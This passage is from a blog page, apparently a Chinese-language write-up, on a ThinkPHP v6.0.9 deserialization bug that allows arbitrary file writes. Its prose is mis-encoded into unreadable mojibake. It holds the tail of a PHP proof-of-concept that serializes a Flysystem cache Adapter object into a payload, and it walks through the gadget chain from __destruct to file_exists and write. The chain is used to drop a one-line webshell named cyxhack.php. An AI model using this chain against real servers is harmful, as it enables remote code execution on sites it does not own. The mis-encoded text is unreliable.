class="comment">//è¿™é‡Œè¿›è¡Œç›®å½•çš„æ›´æ”¹</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	$<span class="title">a</span> = <span class="title">new</span> \<span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>();</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å†™å…¥æœ¨é©¬<br><img src="https://img-blog.csdnimg.cn/b79986d17dd34bfe995e0a8cd48bc033.png"></p>
<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å…¨å±€æœç´¢__destruct()<br><img src="https://img-blog.csdnimg.cn/a8defd503b8c4430ac7b703f2206b9f7.png"><br>åœ¨src/Storage/AbstractCache.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœautosaveä¸ºfalseåˆ™æ‰§è¡Œsave()å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/29dc9df67c334f218d0ba316c1083cc7.png"><br>æŸ¥æ‰¾save()å‡½æ•°<br>å‘ç°åœ¨<br><img src="https://img-blog.csdnimg.cn/0e75786ecc6f49f1bcfa51ad59d21cd9.png"><br>è·Ÿè¿›getForStorage()å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/041dc6c3f39d498fb1e54492b13d518d.png"><br>å‘ç°å‚æ•°cache complete å’Œæ–¹æ³•cleanContents()åœ¨æŠ½è±¡ç±»ä¸­, expireåœ¨å½“å‰ç±»ä¸­<br>è·Ÿè¿›cleanContents()å‘ç°æ²¡ä»€ä¹ˆç”¨ï¼Œé‚£ä¹ˆåœ¨save()å‡½æ•°ä¸­$contentså‚æ•°æˆ‘ä»¬å¯æ§<br>æ¥ä¸‹æ¥è¿›è¡Œä¸€ä¸ªhas()æ–¹æ³•çš„åˆ¤æ–­ï¼Œæˆ‘ä»¬è‚¯å®šæ˜¯æƒ³è¿›è¡Œwrite()æ–¹æ³•ï¼Œé‚£ä¹ˆhas()å°±è¦è¿”å›ä¸€ä¸ªfalse<br>æœç´¢has()æ–¹æ³•ï¼Œåœ¨src/Adapter/Local.php<br><img src="https://img-blog.csdnimg.cn/1b3fa5321d4c4e4b8e1da71a1eff73b1.png"><br>è¿›åˆ°applyPathPrefix()<br><img src="https://img-blog.csdnimg.cn/8ed457c9afb34482bf633b43f8dd94dc.png"><br>è½¬åˆ°getPathPrefix()å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/74157d07600144c187537a55e0efd11c.png"><br>è¿™é‡Œçš„getPathPrefix()å‡½æ•°å¯æ§ï¼Œè®©pathPrefixä¸º ./ å†é…åˆltrimå¯ä»¥æ§åˆ¶ä»»æ„å†™å…¥æ–‡ä»¶çš„ç›®å½•åœ°å€</p>
<p>ltrimæ„æ€æ˜¯å»é™¤ \ æœ€ç»ˆè¿”å›åˆ°has()çš„ file_exists($ location) å› ä¸ºè¿™é‡Œçš„$locationæ˜¯æˆ‘ä»¬å†™å…¥çš„æ–‡ä»¶å: ./cyxhack.phpä¸å­˜åœ¨ï¼Œæ‰€ä»¥è¿”å›false<br>ç„¶åå‘ä¸Šè¿”å›åˆ°write()å‡½æ•°ï¼Œå†™å…¥ä¸€å¥è¯</p>
<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2021/10/16/ThinkPHP%20v6.0.9%20save%28%29%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/">å¤§ä½¬åšå®¢</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>